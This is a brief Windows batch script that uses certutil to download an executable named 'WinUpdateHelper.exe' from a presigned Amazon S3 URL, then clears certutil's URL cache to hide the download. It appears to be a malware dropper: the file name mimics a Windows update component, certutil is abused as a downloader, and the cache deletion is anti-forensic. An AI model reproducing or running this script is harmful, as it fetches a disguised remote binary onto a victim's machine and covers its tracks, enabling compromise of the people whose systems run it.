@echo off
set "URL=https://logs69.s3.eu-west-3.amazonaws.com/WinUpdateHelper.exe?X-Amz-Algorithm=AWS4-HMAC-SHA256^&X-Amz-Credential=AKIAR34JNEAP5K66HU4P%%2F20260204%%2Feu-west-3%%2Fs3%%2Faws4_request^&X-Amz-Date=20260204T170055Z^&X-Amz-Expires=3600^&X-Amz-SignedHeaders=host^&X-Amz-Signature=da585f8c3142ecdd0207348b11dde994c23ddd195841e9383e2099ec6ccd9197"

certutil -urlcache -split -f "%URL%" WinUpdateHelper.exe
certutil -urlcache -split -f "%URL%" delete >nul 2>&1